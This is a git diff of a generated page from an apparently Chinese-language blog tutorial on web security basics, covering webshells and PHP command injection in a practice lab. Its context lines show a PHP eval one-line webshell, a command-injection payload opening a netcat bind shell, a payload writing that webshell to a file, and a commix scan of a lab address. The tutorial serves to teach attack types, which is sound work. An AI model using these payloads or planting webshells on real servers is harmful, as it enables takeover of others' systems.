@@ -126,7 +126,7 @@
 <meta property="og:image" content="http://yoursite.com/2017/09/19/Web-Security-Demo/1.png">
 <meta property="og:image" content="https://mdn.mozillademos.org/files/13673/HTTP%20&%20layers.png">
 <meta property="og:image" content="https://mdn.mozillademos.org/files/13825/HTTPMsg2.png">
-<meta property="og:updated_time" content="2017-10-05T01:25:06.072Z">
+<meta property="og:updated_time" content="2017-10-05T01:28:06.714Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Web安全扫盲Demo">
 <meta name="twitter:description" content="写在前面  开放式Web应用程序安全项目公布的十大WEB安全漏洞OWASP TOP 10 2017">
@@ -415,9 +415,13 @@
 <p>HTTP消息由采用ASCII编码的多行文本构成。在HTTP/1.1及早期版本中，这些消息通过连接公开地发送。在HTTP/2中，为了优化和性能方面的改进，曾经可人工阅读的消息被分到多个HTTP帧中。</p>
 <p><img src="https://mdn.mozillademos.org/files/13825/HTTPMsg2.png" alt="HTTP传输过程"></p>
 <ul>
-<li><strong>Webshell</strong></li>
+<li><p><strong>Webshell</strong></p>
+<blockquote>
+<p>webshell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门。黑客在入侵了一个网站后，通常会将asp或php后门文件与网站服务器WEB目录下正常的网页文件混在一起，然后就可以使用浏览器来访问asp或者php后门，得到一个命令执行环境，以达到控制网站服务器的目的。</p>
+</blockquote>
+</li>
 </ul>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_POST[c]); <span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+ <figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_POST[c]); <span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
 <h4 id="一、信息泄露类"><a href="#一、信息泄露类" class="headerlink" title="一、信息泄露类"></a>一、信息泄露类</h4><h4 id="（一）文件包含漏洞"><a href="#（一）文件包含漏洞" class="headerlink" title="（一）文件包含漏洞"></a>（一）文件包含漏洞</h4><p>PHP文件包含漏洞的产生原因是在通过PHP的函数引入文件时，由于传入的文件名没有经过合理的校验，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。</p>
 <ul>
 <li><strong>漏洞发现</strong><ol>
@@ -463,10 +467,9 @@
 <p><code>1;mkfifo /tmp/e;sh /tmp/e | nc -nlp 2333 &gt; /tmp/e</code></p>
 </li>
 <li><p><strong>写入webshell</strong><br><code>1;echo &#39;&lt;?php eval($_POST[&quot;c&quot;]);?&gt;&#39; &gt; ws.php</code></p>
-<blockquote>
-<p><strong>webshell</strong>:webshell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门。黑客在入侵了一个网站后，通常会将asp或php后门文件与网站服务器WEB目录下正常的网页文件混在一起，然后就可以使用浏览器来访问asp或者php后门，得到一个命令执行环境，以达到控制网站服务器的目的。</p>
-</blockquote>
 </li>
+</ol>
+<ol>
 <li><p><strong>利用commix自动测试</strong></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python commix.py --url=&quot;http://172.17.205.232:89/vulnerabilities/exec/#&quot; --data=&quot;ip=INJECT_HERE&amp;submit=submit&quot;  --cookie=&quot;PHPSESSID=sh36ods5unj4lqfuuojohp0o44;security=low&quot;</div></pre></td></tr></table></figure>
 </li>
